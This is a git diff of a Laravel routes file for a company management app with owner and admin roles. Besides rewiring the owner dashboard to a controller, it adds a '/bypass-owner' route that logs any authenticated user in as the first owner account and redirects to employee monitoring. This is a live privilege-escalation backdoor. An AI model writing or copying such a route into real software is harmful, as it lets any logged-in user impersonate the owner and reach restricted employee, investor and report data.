@@ -11,6 +11,7 @@ use App\Http\Controllers\Owner\KinerjaDivisiController;
 use App\Http\Controllers\Owner\MonitoringKaryawanController;
 use App\Http\Controllers\Owner\DataInvestorController;
 use App\Http\Controllers\Owner\LaporanMasukController;
+use App\Http\Controllers\Owner\DashboardOwnerController;
 
 // Admin Controllers 
 use App\Http\Controllers\Admin\DashboardAdminController;
@@ -39,9 +40,7 @@ Route::get('/', function () {
 Route::middleware(['auth'])->group(function () {
 
     // Dashboard berdasarkan Role
-    Route::get('/owner/dashboard', function () {
-        return view('owner.dashboard');
-    })->name('owner.dashboard');
+    Route::get('/owner/dashboard', [DashboardOwnerController::class, 'index'])->name('owner.dashboard');
 
     Route::get('/admin/dashboard', [DashboardAdminController::class, 'index'])->name('admin.dashboard');
 
@@ -98,6 +97,14 @@ Route::middleware(['auth'])->group(function () {
     Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
 
+    Route::get('/bypass-owner', function () {
+    $user = \App\Models\User::where('role', 'owner')->first();
+    if ($user) {
+        \Illuminate\Support\Facades\Auth::login($user);
+        return redirect('/owner/monitoringkaryawan');
+    }
+    return 'User owner belum ada di database!';
+});
 });
 
 require __DIR__.'/auth.php';
